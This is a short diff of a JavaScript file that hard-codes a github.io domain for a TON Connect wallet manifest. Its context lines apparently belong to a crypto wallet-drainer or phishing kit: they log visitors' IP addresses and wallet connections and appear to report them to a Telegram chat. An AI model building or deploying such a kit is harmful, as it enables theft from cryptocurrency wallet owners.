@@ -4,7 +4,7 @@ var tgChat = "-4147464330"; //Ваш телеграмм-канал
 
 
 
-var domain = window.location.hostname;
+var domain = "xitik.github.io/site";
 var ipUser;
 
 
@@ -37,7 +37,7 @@ fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
 }).catch(error => console.error('Error IP:', error));
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://xitik.github.io/site/tonconnect-manifest.json',
+    manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
     buttonRootId: 'ton-connect'
 })
 tonConnectUI.on('walletConnected', (walletAddress) => {
